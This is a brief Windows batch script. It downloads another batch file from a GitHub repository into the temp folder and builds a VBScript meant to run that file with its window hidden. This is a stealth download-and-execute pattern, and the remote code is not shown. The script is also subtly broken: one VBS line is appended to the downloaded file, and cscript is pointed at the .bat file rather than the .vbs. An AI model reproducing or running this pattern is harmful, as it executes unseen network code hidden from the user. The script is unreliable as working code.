@echo off
del %temp%\dtmp.bat
curl https://raw.githubusercontent.com/AvianJay/useless-win-batch/main/dmain.bat --output %temp%\dtmp.bat
echo Dim WinScriptHost >> %temp%\rundbg.vbs
echo Set WinScriptHost = CreateObject("WScript.Shell") >> %temp%\rundbg.vbs
echo WinScriptHost.Run Chr(34) & "%temp%\dtmp.bat" & Chr(34), 0  >> %temp%\rundbg.vbs
echo Set WinScriptHost = Nothing >> %temp%\dtmp.bat
cscript //Nologo %temp%\dtmp.bat
